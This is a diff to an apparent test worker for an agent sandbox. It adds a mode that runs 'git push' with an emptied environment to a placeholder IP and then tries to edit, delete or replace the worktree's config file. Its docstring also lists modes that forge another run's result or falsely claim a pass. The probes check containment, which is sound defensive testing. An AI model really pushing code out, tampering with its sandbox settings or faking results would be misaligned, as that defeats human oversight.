@@ -22,6 +22,9 @@ task instructions:
 - forge:    tries to overwrite another run's result (``victim``) beside its own
             result directory, records what the sandbox let it do next to
             --out, then happy-min (W26)
+- gitpush:  a grandchild with an EMPTIED env runs ``git push`` over https, and
+            the worker tries to rewrite its worktree's config.worktree;
+            both outcomes recorded next to --out (W31), then happy-min
 - wrongid:  happy, but its result envelope names another task id (W26)
 - liar:     claims completed+passed, but the patch contradicts the recorded
             verification command (G10 re-verification must catch the lie)
@@ -217,6 +220,47 @@ def main() -> int:
             except OSError as exc:
                 attempts[target.name] = exc.errno
         (args.out.parent / f"forge-{task_id}.json").write_text(json.dumps(attempts))
+
+    if mode == "gitpush":
+        import shutil
+        import subprocess
+
+        git_bin = shutil.which("git") or "git"
+        pushed = subprocess.run(
+            [git_bin, "push", "https://192.0.2.1/x.git", "HEAD:refs/heads/x"],
+            cwd=workspace,
+            env={},  # what `env -i` or subprocess.run(env={}) hands git
+            capture_output=True,
+            text=True,
+            timeout=60,
+        )
+        git_dir = subprocess.run(
+            [git_bin, "rev-parse", "--absolute-git-dir"],
+            cwd=workspace,
+            capture_output=True,
+            text=True,
+        ).stdout.strip()
+        pin = Path(git_dir, "config.worktree")
+        decoy = Path(git_dir, "decoy")
+        tries: dict[str, object] = {}
+
+        def replace() -> None:
+            decoy.write_text("")
+            os.replace(decoy, pin)
+
+        for name, attempt in (
+            ("edit", lambda: pin.write_text("")),
+            ("unlink", pin.unlink),
+            ("replace", replace),
+        ):
+            try:
+                attempt()
+                tries[name] = "done"
+            except OSError as exc:
+                tries[name] = exc.errno
+        (args.out.parent / f"gitpush-{task_id}.json").write_text(
+            json.dumps({"rc": pushed.returncode, "stderr": pushed.stderr, **tries})
+        )
 
     approval_verdict = task.get("approval_verdict")
     resumed_with_approval = isinstance(approval_verdict, dict) and approval_verdict.get("approved")
